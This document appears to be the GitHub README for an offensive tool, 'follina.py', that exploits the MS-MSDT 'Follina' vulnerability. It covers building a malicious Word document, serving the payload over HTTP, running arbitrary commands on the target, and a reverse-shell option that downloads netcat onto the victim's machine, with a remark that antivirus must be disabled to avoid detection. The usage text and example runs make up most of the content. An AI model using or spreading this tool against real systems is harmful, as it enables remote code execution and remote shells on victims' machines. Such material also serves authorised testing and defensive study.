# MS-MSDT-Follina-Attack-Vector
MS-MSDT "Follina"
Create a "Follina" MS-MSDT attack with a malicious Microsoft Word document and stage a payload with an HTTP server.

<p align="center">
    <img src="https://github.com/trewisscotch/MS-MSDT-Follina-Attack-Vector/blob/main/171033876-dbe73e3e-0a3a-436a-91d8-7fa77a5c1ace.png" alt="Image"  />
</p>

# Usage

```
usage: follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]

options:
  -h, --help            show this help message and exit
  --command COMMAND, -c COMMAND
                        command to run on the target (default: calc)
  --output OUTPUT, -o OUTPUT
                        output maldoc file (default: ./follina.doc)
  --interface INTERFACE, -i INTERFACE
                        network interface or IP address to host the HTTP server (default: eth0)
  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)
```

# Examples

Pop `calc.exe`:

```
$ python3 follina.py   
[+] copied staging doc /tmp/9mcvbrwo
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
```

Pop `notepad.exe`:

```
$ python3 follina.py -c "notepad"
```

Get a reverse shell on port 9001. **Note, this downloads a netcat binary _onto the victim_ and places it in `C:\Windows\Tasks`. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.**

```
$ python3 follina.py -r 9001
```

<p align="center">
    <img src="https://github.com/trewisscotch/MS-MSDT-Follina-Attack-Vector/blob/main/171037880-03a73d6a-4606-4c42-abcb-ee52a9e669c6.png" alt="Image"  />
</p>
